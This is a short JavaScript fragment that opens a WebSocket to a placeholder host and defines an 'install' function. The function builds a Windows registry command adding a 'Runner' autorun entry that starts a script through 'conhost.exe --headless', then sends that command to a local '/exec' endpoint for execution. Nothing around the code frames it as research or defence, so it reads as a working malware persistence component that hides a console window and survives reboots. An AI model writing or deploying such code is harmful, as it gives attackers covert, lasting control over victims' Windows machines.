const ws = new WebSocket("wss://example.org/socket");
function install(runtime, entry) {
  const command = 'reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v Runner /t REG_SZ /d "conhost.exe --headless ' + runtime + ' --allow-run ' + entry + '" /f';
  return fetch("http://127.0.0.1:12345/exec", {
    method: "POST",
    body: JSON.stringify({ command }),
  });
}
